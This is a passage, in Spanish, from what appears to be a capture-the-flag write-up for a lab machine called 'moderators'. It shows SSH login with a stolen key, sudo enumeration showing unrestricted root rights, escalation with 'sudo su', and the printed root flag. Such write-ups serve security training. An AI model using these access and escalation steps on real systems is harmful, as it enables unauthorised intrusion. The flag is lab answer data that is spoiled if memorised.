echo $paswd|sudo apt-get -y upgrade
```

Pruebo si es la contraseña de john y si tengo privilegios a nivel de sudoers

```null
ssh john@10.10.11.173 -i id_rsa
Last login: Fri Feb  3 13:34:27 2023 from 10.10.14.7
john@moderators:~$ export TERM=xterm
john@moderators:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on moderators:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on moderators:
    (root) ALL
john@moderators:~$ 
```

Como puedo ejecutar cualquier comando como el usuario root, spawneo una bash y visualizo la segunda flag

```null
john@moderators:~$ sudo su
root@moderators:/home/john# cat /root/root.txt
b5c031654e91223edc1a2ab50415b312
```